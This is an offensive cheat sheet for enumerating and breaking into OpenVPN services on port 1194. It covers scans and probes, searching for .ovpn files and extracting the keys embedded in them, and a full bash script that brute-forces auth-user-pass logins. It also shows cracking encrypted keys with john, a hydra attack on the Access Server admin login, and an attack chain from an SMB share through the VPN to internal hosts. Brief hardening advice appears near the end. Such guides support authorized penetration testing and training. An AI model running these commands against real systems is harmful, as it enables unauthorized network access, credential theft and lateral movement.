# OPENVPN ENUMERATION (Port 1194/UDP)

## SERVICE OVERVIEW
```
OpenVPN - Open-source VPN solution
- Default port: 1194/UDP (can also use TCP)
- Provides secure point-to-point/site-to-site connections
- Requires client configuration file (.ovpn)
- May reveal internal network access
- Often misconfigured with weak authentication
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -sU -p1194 <IP>                        # UDP scan with version detection
nmap -sV -p1194 <IP>                            # TCP scan (if used)
nc -u <IP> 1194                                 # Manual UDP connection

# OpenVPN detection
nmap -sU -p1194 --script openvpn-info <IP>      # OpenVPN info script
```

## NMAP ENUMERATION
```bash
# OpenVPN detection and enumeration
nmap -sU -p1194 --script openvpn-info <IP>      # Get OpenVPN server info

# Version detection
nmap -sV -sU -p1194 <IP>

# Both TCP and UDP
nmap -sV -sU -sT -p1194 <IP>
```

## OPENVPN INFO GATHERING
```bash
# Get server info (cipher, auth method, etc.)
nmap -sU -p1194 --script openvpn-info <IP>

# Information revealed:
# - OpenVPN version
# - Cipher algorithm (AES-256-CBC, etc.)
# - Authentication method (TLS, static key)
# - Compression settings
# - TLS version

# Manual probe
echo -e "\x00\x0e\x38\x00\x00\x00\x00\x00" | nc -u <IP> 1194
```

## CLIENT CONFIGURATION ENUMERATION
```bash
# Look for .ovpn configuration files
# Common locations:
/etc/openvpn/client.conf
/etc/openvpn/*.ovpn
C:\Program Files\OpenVPN\config\*.ovpn
~/Downloads/*.ovpn
~/Documents/*.ovpn

# If you have file access (via SMB, FTP, HTTP):
find / -name "*.ovpn" 2>/dev/null
locate client.ovpn
grep -r "remote " /etc/openvpn/
grep -r "auth-user-pass" /etc/openvpn/
```

## CLIENT CONFIGURATION FILE (.ovpn)
```bash
# Typical .ovpn file contents:
client
dev tun
proto udp
remote <IP> 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt                                       # CA certificate
cert client.crt                                 # Client certificate
key client.key                                  # Client private key
remote-cert-tls server
cipher AES-256-CBC
auth SHA256
verb 3

# Key information to extract:
# - Server IP/hostname
# - Port and protocol (UDP/TCP)
# - Authentication method (certs, user/pass)
# - Cipher and hash algorithms
# - CA and client certificates (if embedded)
```

## EMBEDDED CREDENTIALS IN .OVPN
```bash
# Some .ovpn files embed certificates/keys:
cat client.ovpn

# Look for:
<ca>
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
</ca>

<cert>
-----BEGIN CERTIFICATE-----
...
-----END CERTIFICATE-----
</cert>

<key>
-----BEGIN PRIVATE KEY-----
...
-----END PRIVATE KEY-----
</key>

# Extract embedded credentials
csplit -f cert- client.ovpn '/BEGIN CERTIFICATE/' '/END CERTIFICATE/'
csplit -f key- client.ovpn '/BEGIN.*KEY/' '/END.*KEY/'
```

## CONNECT WITH CLIENT CONFIG
```bash
# If you have a valid .ovpn file:
openvpn --config client.ovpn

# With username/password (if auth-user-pass)
openvpn --config client.ovpn --auth-user-pass creds.txt
# creds.txt format:
# username
# password

# Connect and run in background
openvpn --config client.ovpn --daemon

# Test connection
openvpn --config client.ovpn --verb 4          # Verbose output
```

## BRUTE FORCE ATTACKS
```bash
# If auth-user-pass is enabled, brute force possible
# Note: OpenVPN doesn't have built-in rate limiting

# Custom brute force script
cat > openvpn_brute.sh <<'EOF'
#!/bin/bash
CONFIG=$1
USERLIST=$2
PASSLIST=$3

for user in $(cat $USERLIST); do
  for pass in $(cat $PASSLIST); do
    echo "Trying: $user:$pass"
    echo -e "$user\n$pass" > creds.txt
    timeout 10 openvpn --config $CONFIG --auth-user-pass creds.txt 2>&1 | grep -i "initialization sequence completed" && echo "[+] Success: $user:$pass" && exit 0
  done
done
EOF

chmod +x openvpn_brute.sh
./openvpn_brute.sh client.ovpn users.txt passwords.txt
```

## CERTIFICATE-BASED AUTHENTICATION
```bash
# If using client certificates (.crt/.key):
# Extract from .ovpn or separate files

# Connect with certificate
openvpn --config client.ovpn --cert client.crt --key client.key --ca ca.crt

# If client.key is encrypted:
openssl rsa -in client.key.encrypted -out client.key.decrypted
# Enter passphrase

# Brute force encrypted key
ssh2john client.key > client.key.hash
john --wordlist=rockyou.txt client.key.hash
```

## POST-CONNECTION ENUMERATION
```bash
# After successful OpenVPN connection:

# Check assigned IP
ip a show tun0                                  # VPN interface
ifconfig tun0

# Check routing
ip route
route -n

# Enumerate internal network
# Typically VPN assigns 10.x.x.x or 172.16.x.x range
nmap -sn 10.8.0.0/24                            # Ping scan VPN network
nmap -sV -p- 10.8.0.1                           # Scan VPN gateway

# Check DNS
cat /etc/resolv.conf                            # DNS servers pushed by VPN

# Test internal access
curl http://10.8.0.1/                           # Internal web server
ssh 10.8.0.5                                    # Internal SSH
```

## OPENVPN SERVER ENUMERATION
```bash
# If you compromise OpenVPN server:

# Configuration files
/etc/openvpn/server.conf                        # Main config
/etc/openvpn/ccd/                               # Client-specific configs
/etc/openvpn/easy-rsa/                          # Certificate authority
/var/log/openvpn.log                            # Logs (active connections)

# Check for client credentials
cat /etc/openvpn/ipp.txt                        # IP assignments (client names)
ls /etc/openvpn/ccd/                            # Client-specific configs

# Active connections
cat /var/log/openvpn.log | grep "Peer Connection Initiated"
netstat -anp | grep 1194
```

## COMMON MISCONFIGURATIONS
```
☐ .ovpn files with embedded credentials accessible (SMB, FTP, web)
☐ Weak or default passwords for auth-user-pass
☐ Client certificates without encryption (no passphrase)
☐ Overly permissive network access after VPN connection
☐ VPN credentials stored in plaintext
☐ No multi-factor authentication
☐ Outdated OpenVPN version with known vulnerabilities
☐ VPN config files in web-accessible directories
☐ Shared client certificates (multiple users, same cert)
```

## VULNERABILITY SCANNING
```bash
# Search for OpenVPN exploits
searchsploit openvpn

# Known vulnerabilities:
# CVE-2017-12166: OpenVPN remote DoS
# CVE-2020-15078: Authentication bypass (OpenVPN Access Server)
# CVE-2022-0547: OpenVPN plugin loading vulnerability

# Check version
nmap -sU -p1194 --script openvpn-info <IP> | grep -i version
```

## METASPLOIT MODULES
```bash
msfconsole
# Limited OpenVPN modules

use auxiliary/scanner/openvpn/openvpn_detect    # Detect OpenVPN
set RHOSTS <IP>
run

# If OpenVPN Access Server (web-based):
use auxiliary/scanner/http/openvpn_login       # Login scanner
set RHOSTS <IP>
set RPORT 443
run
```

## QUICK WIN CHECKLIST
```
☐ Scan for OpenVPN on UDP 1194 (and TCP if used)
☐ Get server info (version, cipher, auth method)
☐ Search for .ovpn files (SMB shares, FTP, web directories)
☐ Check for embedded credentials in .ovpn files
☐ Extract certificates/keys from .ovpn
☐ Test connection with found credentials
☐ Brute force auth-user-pass if enabled
☐ Enumerate internal network after connection
☐ Look for privilege escalation on VPN server
☐ Check for known OpenVPN exploits (version-specific)
```

## ONE-LINER ENUMERATION
```bash
# Quick OpenVPN detection
nmap -sU -p1194 --script openvpn-info <IP>

# Search for .ovpn files (if SMB/FTP access)
smbmap -H <IP> -R | grep -i ".ovpn"
```

## SECURITY IMPLICATIONS
```
RISKS:
- Internal network access via compromised VPN
- Lateral movement to internal systems
- Data exfiltration through VPN tunnel
- Credential theft (.ovpn files with embedded creds)
- Persistent access (VPN connection from external location)
- Bypass of perimeter security controls
- Man-in-the-Middle (if weak ciphers used)

RECOMMENDATIONS:
- Use strong authentication (certificates + username/password)
- Implement multi-factor authentication
- Don't embed credentials in .ovpn files
- Use strong ciphers (AES-256-GCM, not legacy CBC)
- Restrict VPN user permissions (least privilege)
- Monitor VPN connections (unusual IPs, times)
- Regular audit of .ovpn file distribution
- Disable unused VPN accounts
- Implement certificate revocation list (CRL)
- Use TLS 1.2 or higher
```

## TOOLS
```bash
# OpenVPN client
apt-get install openvpn
openvpn --config client.ovpn

# Nmap
nmap -sU -p1194 --script openvpn-info <IP>

# searchsploit
searchsploit openvpn

# John the Ripper (crack encrypted keys)
ssh2john client.key > key.hash
john --wordlist=rockyou.txt key.hash
```

## OPENVPN ACCESS SERVER (WEB-BASED)
```bash
# OpenVPN Access Server uses web interface (port 443/943)
# Check for web-based admin panel:
curl -k https://<IP>:943/
curl -k https://<IP>/admin

# Default credentials:
# Username: openvpn
# Password: <randomly generated, check /usr/local/openvpn_as/init.log>

# Brute force web login
hydra -l openvpn -P passwords.txt <IP> https-post-form "/admin:username=^USER^&password=^PASS^:F=incorrect"
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain example:

# 1. Find .ovpn file on SMB share
smbmap -H <IP> -R | grep ".ovpn"
smbclient //<IP>/share -U user%pass
smb> get client.ovpn

# 2. Extract embedded credentials
cat client.ovpn | grep -A 50 "<key>"

# 3. Connect to VPN
openvpn --config client.ovpn --daemon

# 4. Enumerate internal network
nmap -sn 10.8.0.0/24

# 5. Attack internal systems
nmap -sV -p- 10.8.0.10
crackmapexec smb 10.8.0.0/24 -u Administrator -p 'Password123!'
```
